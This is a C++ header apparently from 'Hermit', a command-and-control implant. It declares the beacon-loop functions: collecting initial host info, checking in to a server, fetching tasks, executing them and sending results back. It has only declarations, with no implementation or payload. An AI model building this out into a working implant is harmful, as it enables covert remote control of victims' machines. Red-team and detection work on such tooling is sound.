#ifndef HERMIT_CORE_HANDLER_HPP
#define HERMIT_CORE_HANDLER_HPP

#include "core/task.hpp"
#include "core/system.hpp"
#include "core/utils.hpp"

namespace Handler
{
	std::wstring GetInitialInfo();

	BOOL CheckIn(
        HINTERNET hConnect,
        LPCWSTR lpHost,
        INTERNET_PORT nPort,
        LPCWSTR lpPath,
        const std::wstring& wInfoJson
    );

	std::wstring GetTask(
		HINTERNET hConnect,
		LPCWSTR lpHost,
		INTERNET_PORT nPort,
		LPCWSTR lpPath
	);

	std::wstring ExecuteTask(
		HINSTANCE hInstance,
		INT nCmdShow,
		HINTERNET hConnect,
		const std::wstring& task,
		INT &nSleep
	);

	BOOL SendTaskResult(
		HINTERNET hConnect,
		LPCWSTR lpHost,
		INTERNET_PORT nPort,
		LPCWSTR lpPath,
		const std::wstring& task,
		const std::wstring& taskResult
	);
}


#endif // HERMIT_CORE_HANDLER_HPP